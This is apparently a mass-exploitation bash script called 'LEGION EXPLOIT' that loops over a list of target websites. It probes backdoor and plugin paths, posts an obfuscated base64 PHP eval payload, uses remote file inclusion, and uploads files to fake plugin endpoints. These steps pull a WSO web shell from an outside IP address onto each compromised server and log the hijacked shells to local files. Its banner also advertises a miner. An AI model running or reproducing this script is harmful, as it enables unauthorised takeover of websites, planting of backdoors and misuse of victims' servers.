#!/bin/bash
#T.me/mylegion2

phpytama() {
    target=$1
    progi=$(curl -s -k --no-keepalive --max-time 15 "${target}/?2020abc_url1=1008-lf.txt&writerfilename=sindex.php")
    progo=$(curl -s -k --no-keepalive --max-time 15 "${target}/kindex.php?daksldlkdsadas=1&WordPress=/82nlf3.txt&Database=sindex.php")
    progu=$(curl -s -k --no-keepalive --max-time 15 "${target}/windex.php?daksldlkdsadas=1&WordPress=/82nlf3.txt&Database=sindex.php")
    progud=$(curl -s -k --no-keepalive --max-time 15 "${target}/old-index.php?daksldlkdsadas=1&WordPress=82nlf3.txt&Database=sindex.php")
    if [[ $(curl -s -k --no-keepalive --max-time 15 -X POST ${target}/sindex.php \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -H 'Accept-Charset: utf-8' \
    -H 'Referer: -' \
    -H 'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)' \
    -d 'pass=am*guAW8.ryDgz-TYF&a=Php&p1=eval(base64_decode('\''ZWNobyAnPGNlbnRlcj48aDE%2BTEVHSU9OIEVYUExPSVQ8L2gxPicuJzxicj4nLidbdW5hbWVdICcucGhwX3VuYW1lKCkuJyBbL3VuYW1lXSAnOyBzeXN0ZW0oJ2N1cmwgLXMgLWsgMi41Ny4xMjIuMjIwL2NvbmYvbG9hZCAtbyBvbGQtaW5kZXgucGhwJyk7'\''))%3B' | grep -o 'LEGION ') =~ 'LEGION ' ]];
    then
    echo -e "\e[32m# \e[36m LEGION EXPLOIT \e[33m$target \e[36m--> \e[32mUpload OK \e[33m WSO SPAWNED IN \e[32m$target/old-index.php\e[0m"
    echo -e "$target/sindex.php" | tee -a tesbash.txt
	echo -e "$target/old-index.php" | tee -a wso.txt
    else
    echo -e "\e[31m$target \e[36m--> \e[33mNOT \e[36mBONJOUR \e[0m(\e[32mPATH\e[0m)\e[0m"
    fi
    }
php() {
    target=$1
    if [[ $(curl -s -k --no-keepalive --max-time 15 -X POST ${target}/baindex.php \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -H 'Accept-Charset: utf-8' \
    -H 'Referer: -' \
    -H 'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)' \
    -d 'pass=am*guAW8.ryDgz-TYF&a=Php&p1=eval(base64_decode('\''ZWNobyAnPGNlbnRlcj48aDE%2BTEVHSU9OIEVYUExPSVQ8L2gxPicuJzxicj4nLidbdW5hbWVdICcucGhwX3VuYW1lKCkuJyBbL3VuYW1lXSAnOyBzeXN0ZW0oJ2N1cmwgLXMgLWsgMi41Ny4xMjIuMjIwL2NvbmYvbG9hZCAtbyBvbGQtaW5kZXgucGhwJyk7'\''))%3B' | grep -o 'LEGION') =~ 'LEGION' ]];
    then
    echo -e "\e[32mBADGUYS \e[31mEXPLOIT \e[33m$target \e[36m--> \e[32mUpload OK \e[33m SHELL SPAWNED\e[0m"
    echo "$target/baindex.php" | tee -a tesbash.txt
	echo "$target/old-index.php" | tee -a wso.txt
    else
    echo -e "\e[33m$target \e[36m--> \e[31mNOT VULN\e[0m"
    fi
    }
load() {
    target=$1
    if [[ $(curl -s -k --no-keepalive --max-time 15 "${target}/lindex.php?idb=2.57.122.220/conf/license2.txt" | grep -o 'LEGION') =~ 'LEGION' ]];
    then
    echo -e "\e[32m# \e[36m LEGION EXPLOIT \e[33m$target \e[36m--> \e[32mCONFIG PATH OK \e[33m WSO SPAWNED IN \e[32m$target/old-index.php\e[0m"
    echo "$target/lindex.php?idb=2.57.122.220/conf/license2.txt" | tee -a conf.txt
	echo "$target/old-index.php" | tee -a wso.txt
    else
    echo -e "\e[31m$target \e[36m--> \e[33mI NOT FOUND \e[36mBONJOUR \e[0m(\e[32mPATH\e[0m)\e[0m"
    fi
    }
load1() {
    target=$1
    if [[ $(curl -s -k --no-keepalive --max-time 15 "${target}/?puntent-goput=2.57.122.220/conf/license2.txt" | grep -o 'LEGION') =~ 'LEGION' ]];
    then
    echo -e "\e[32mBADGUYS \e[31mEXPLOIT \e[33m$target \e[36m--> \e[32mCONFIG LOAD OK\e[0m"
    echo "$target/?matamu=2.57.122.220/conf/license2.txt" | tee -a conf.txt
	echo "$target/old-index.php" | tee -a wso.txt
    else
    echo -e "\e[33m$target \e[36m--> \e[31mNOT VULN\e[0m"
    fi
    }
load2() {
    target=$1
    if [[ $(curl -s -k --no-keepalive --max-time 15 "${target}/?matamu=2.57.122.220/conf/license2.txt" | grep -o 'LEGION') =~ 'LEGION' ]];
    then
    echo -e "\e[32mBADGUYS \e[31mEXPLOIT \e[33m$target \e[36m--> \e[32mCONFIG LOAD OK\e[0m"
    echo "$target/?matamu=2.57.122.220/conf/license2.txt" | tee -a conf.txt
	echo "$target/old-index.php" | tee -a wso.txt
    else
    echo -e "\e[33m$target \e[36m--> \e[31mNOT VULN\e[0m"
    fi
    }
ayax() {
    target=$1
    if [[ $(curl -s -k --no-keepalive --max-time 15 "${target}/ajax-index.php?url=2.57.122.220/conf/license2.txt" | grep -o 'LEGION') =~ 'LEGION' ]];
    then
    echo -e "\e[32mBADGUYS \e[31mEXPLOIT \e[33m$target \e[36m--> \e[32mUpload OK \e[32m AJAX \e[33mSHELL SPAWNED\e[0m"
    echo "$target//ajax-index.php?url=2.57.122.220/conf/license2.txt" | tee -a ayaxx.txt
	echo "$target/old-index.php" | tee -a wso.txt
    else
    echo -e "\e[33m$target \e[36m--> \e[31mNOT VULN\e[0m"
    fi
    }
rce() {
    target=$1
    upload=$(curl -s -k --no-keepalive --max-time 15 -F "filename=@./ruun.php" "${target}/wp-content/plugins/apikey/apikey.php?test=hello" | head -1)
    if [[ $upload =~ 'testtrue' ]]; then
    Kernel=$(curl -s -k --no-keepalive --max-time 15 "${target}/wp-content/plugins/apikey/ruun.php?idbteam=2.57.122.220/conf/license2.txt" | grep -i "uname" | cut -d '[' -f 2 | awk '{gsub("uname]","")}1')
    echo -e "\e[32mBADGUYS \e[31mEXPLOIT \e[33m$target/wp-content/plugins/apikey/ruun.php?idbteam=2.57.122.220/conf/license2.txt" | tee -a massif.txt
	echo "$Kernel" | tee -a rce.txt
	echo "$Kernel/old-index.php" | tee -a wso.txt
    else
    echo -e "\e[33m$target \e[36m--> \e[36mRCE \e[31mNOT VULN\e[0m"
    fi
    }
rce2() {
    target=$1
    upload=$(curl -s -k --no-keepalive --max-time 15 -F "filename=@./ruun.php" "${target}/plugins/content/apismtp/apismtp.php?test=hello" | head -1)
    if [[ $upload =~ 'testtrue' ]]; then
    Kernel=$(curl -s -k --no-keepalive --max-time 15 "${target}/plugins/content/apismtp/ruun.php?idbteam=2.57.122.220/conf/license2.txt" | grep -i "uname" | cut -d '[' -f 2 | awk '{gsub("uname]","")}1')
	echo -e "\e[32mBADGUYS \e[31mEXPLOIT \e[33m$target/plugins/content/apismtp/ruun.php?idbteam=2.57.122.220/conf/license2.txt" | tee -a massif.txt
	echo "$Kernel" | tee -a rce.txt
	echo "$Kernel/old-index.php" | tee -a wso.txt
    else
    echo -e "\e[33m$target \e[36m--> \e[36mRCE \e[31mNOT VULN\e[0m"
    fi
    }
wiki() {
    target=$1
    if [[ $(curl -s -k --no-keepalive --max-time 15 -X POST ${target}/wikindex.php \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -H 'Accept-Charset: utf-8' \
    -H 'Referer: -' \
    -H 'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)' \
    -d 'pass=am*guAW8.ryDgz-TYF&a=Php&p1=eval(base64_decode('\''ZWNobyAnPGNlbnRlcj48aDE%2BTEVHSU9OIEVYUExPSVQ8L2gxPicuJzxicj4nLidbdW5hbWVdICcucGhwX3VuYW1lKCkuJyBbL3VuYW1lXSAnOyBzeXN0ZW0oJ2N1cmwgLXMgLWsgMi41Ny4xMjIuMjIwL2NvbmYvbG9hZCAtbyBvbGQtaW5kZXgucGhwJyk7'\''))%3B' | grep -o 'LEGION') ]];
    then
    echo -e "\e[32mBADGUYS \e[31mEXPLOIT \e[33m$target \e[36m--> \e[32mUpload OK WIKI\e[33m SHELL SPAWNED\e[0m"
    echo "$target/wikindex.php" | tee -a tesbash.txt
	echo "$target/old-index.php" | tee -a wso.txt
    else
    echo -e "\e[31m$target \e[36m--> \e[33mNOT \e[36mBONJOUR \e[0m(\e[32mPATH\e[0m)\e[0m"
    fi
    }
site() {
    target=$1
    if [[ $(curl -s -k --no-keepalive --max-time 15 -X POST ${target}/new-index.php \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -H 'Accept-Charset: utf-8' \
    -H 'Referer: -' \
    -H 'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)' \
    -d 'pass=am*guAW8.ryDgz-TYF&a=Php&p1=eval(base64_decode('\''ZWNobyAnPGNlbnRlcj48aDE%2BTEVHSU9OIEVYUExPSVQ8L2gxPicuJzxicj4nLidbdW5hbWVdICcucGhwX3VuYW1lKCkuJyBbL3VuYW1lXSAnOyBzeXN0ZW0oJ2N1cmwgLXMgLWsgMi41Ny4xMjIuMjIwL2NvbmYvbG9hZCAtbyBvbGQtaW5kZXgucGhwJyk7'\''))%3B' | grep -o 'LEGION') ]];
    then
    echo -e "\e[32mBADGUYS \e[31mEXPLOIT \e[33m$target \e[36m--> \e[32mUpload OK \e[36mSITE OK\e[33m SHELL SPAWNED\e[0m"
    echo "$target/new-index.php" | tee -a tesbash.txt
	echo "$target/old-index.php" | tee -a wso.txt
    else
    echo -e "\e[31m$target \e[36m--> \e[33mNOT \e[36mBONJOUR \e[0m(\e[32mPATH\e[0m)\e[0m"
    sleep 2
    fi
    }
	echo -e "\e[31m  ██╗     ███████╗ ██████╗ ██╗ ██████╗ ███╗   ██╗
  ██║     ██╔════╝██╔════╝ ██║██╔═══██╗████╗  ██║
  ██║     █████╗  ██║  ███╗██║██║   ██║██╔██╗ ██║
  ██║     ██╔══╝  ██║   ██║██║██║   ██║██║╚██╗██║
  ███████╗███████╗╚██████╔╝██║╚██████╔╝██║ ╚████║
  ╚══════╝╚══════╝ ╚═════╝ ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
                                                 "
echo -e "[+] \e[31m LEGION \e[33m EXPLOIT\e[0m"
echo -e "[-] \e[31mUSAGE!! \e[33mExample: \e[32m$0 <List.txt> \e[0m"
echo -e "[-] \e[31mWARNING!! \e[36mThis is a \e[31mPRIV8 \e[36mExploit by \e[32mMy Legion\e[0m"

echo -e "[-] \e[31mWP SHELLS \e[32m+ \e[33m MULTIPLE PATH \e[32m+ \e[36m MINER\e[0m"
echo -e "[-] \e[32mTelegram Notification \e[32m+ \e[33m CUSTOM UPDATES PATH\e[0m"
read -p "[?] Threads (Default 10): " t
if [[ $t="" ]]; then
	t=5;
fi

read -p "[?] Delay (Default 1): " s
if [[ $s="" ]]; then
	s=1;
fi

n=1
IFS=$'\r\n'
for e in $(cat $1); do
	f=$(expr $n % $t)
	if [[ $f == 0 && $n > 0 ]]; then
		sleep $s
	fi
	d=$(date '+%H:%M:%S')
	c=$(cat $1 | wc -l)
	phpytama $e $n &
	php $e $n &
	load $e $n &
	load1 $e $n &
	load2 $e $n &
	rce $e $n &
	rce2 $e $n &
	ayax $e $n &
	wiki $e $n &
	site $e $n &
     n=$[$n+1]
done
wait
